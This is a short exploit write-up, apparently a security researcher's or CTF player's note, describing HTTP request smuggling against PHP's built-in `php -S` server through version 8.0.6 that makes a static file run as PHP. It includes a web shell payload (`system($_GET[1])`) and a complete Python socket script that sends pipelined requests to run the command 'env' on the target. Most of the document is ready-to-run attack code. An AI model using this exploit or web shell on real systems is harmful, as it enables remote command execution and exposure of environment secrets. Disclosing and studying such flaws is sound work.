## HTTP Request Smuggling Leading to Static File Code Execution in `php -S` Environment

Affected versions: Reproducible from `PHP (cli)` through `8.0.6`

```bash
docker pull php:8.0.6-cli
docker run -p 8888:8888 -it php:8.0.6-cli /bin/bash
```

`php-cli` built-in web server

```bash
php -S 0.0.0.0:8888
```

Any static file such as `flag.txt`, with the following content, or any arbitrary PHP code

```php
<?php phpinfo();?>
```

**Craft the following request packet:**

- **The first request targets a static file,**
- **The second request targets a non-existent `xx.php` file, which causes the static file to be executed as PHP code, accepting both `GET` and `POST` parameters**


![image-20260319202813847](https://raw.githubusercontent.com/lierbushiwo/image/master/20260319202815170.png)

### `GET/POST`parameters

#### `GET`

```php
<?php system($_GET[1]);?>
```

![image-20260319183809870](https://raw.githubusercontent.com/lierbushiwo/image/master/20260319183811469.png)

![image-20260319183928172](https://raw.githubusercontent.com/lierbushiwo/image/master/20260319183929428.png)

exp:

```python
import socket

host = "10.60.174.62"
port = 8888

# 完整还原数据包的原始字节
raw_request = (
    b"GET /flag.txt HTTP/1.1\r\n"
    b"Host: 10.60.174.62:8888\r\n"
    b"\r\n"
    b"\r\n"
    b"GET /xx.php?1=env HTTP/1.1\r\n"
    b"\r\n"
)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.settimeout(5)
    s.connect((host, port))
    s.sendall(raw_request)
    
    response = b""
    try:
        while True:
            data = s.recv(4096)
            if not data:
                break
            response += data
    except socket.timeout:
        pass

print(response.decode(errors="replace"))
```

#### `POST`

Similarly, `POST` is also applicable
![image-20260319193449647](https://raw.githubusercontent.com/lierbushiwo/image/master/20260319193450791.png)